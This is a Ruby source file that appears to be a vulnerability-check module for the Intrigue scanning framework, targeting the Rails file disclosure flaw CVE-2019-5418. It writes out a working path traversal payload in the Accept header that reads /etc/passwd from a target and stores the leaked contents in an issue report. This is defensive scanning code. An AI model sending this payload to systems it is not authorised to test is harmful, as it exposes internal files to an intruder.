module Intrigue
module Task
class RailsFileExposure < BaseTask

  def self.metadata
    {
      :name => "vuln/rails_file_exposure",
      :pretty_name => "Vuln - Rails File Exposure (CVE-2019-5418)",
      :authors => ["jcran", "jhawthorn"],
      :identifiers => [{ "cve" =>  "CVE-2019-5418" }],
      :description => "Rails < 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 is subject to" + 
        " an information disclosure vulnerability which can be triggered by a specially crafted" +
        " accept header.",
      :references => [
        "https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q",
        "https://github.com/mpgn/CVE-2019-5418"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [
        {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}
      ],
      :allowed_options => [],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    ## Trigger: Accept Header of the following form
    ## ../../../../../../../../../../etc/passwd{{
    
    paths = [""] # Enter any known paths here (spidering first might be a good idea)
    headers = {"Accept" => "../../../../../../../../../../etc/passwd{{"}

    paths.each do |p| 

      # Request
      uri = "#{_get_entity_name}/#{p}"
      response = http_request :get, "#{uri}", nil, headers
      etc_passwd_body = response.body if response
      
      # Check for validity
      if response 
        if "#{etc_passwd_body}" =~ /root\:x/
          _log "Got vulnerable response: #{response.body}"
          _create_issue({ 
            name: "Rails information disclosure on #{uri}", 
            type: "internal_information_leak",
            severity: 1,
            status: "confirmed",
            description: "This issue, described in CVE-2019-5418, allows an anonymous user" + 
             " to gather internal files from the affected system, up to and including the" + 
             " /etc/shadow file, depending on permissions. The 'render' command must be" + 
             " used to render a file from disk in order to be vulnerable",
            details: { 
              cve: "CVE-2019-5418",
              uri: uri, 
              data: etc_passwd_body }
          })
        else
          _log "Got non-vulnerable response: #{response.body}"
        end
      else 
        _log "Empty response at #{uri}"
      end
    end

  end

end
end
end
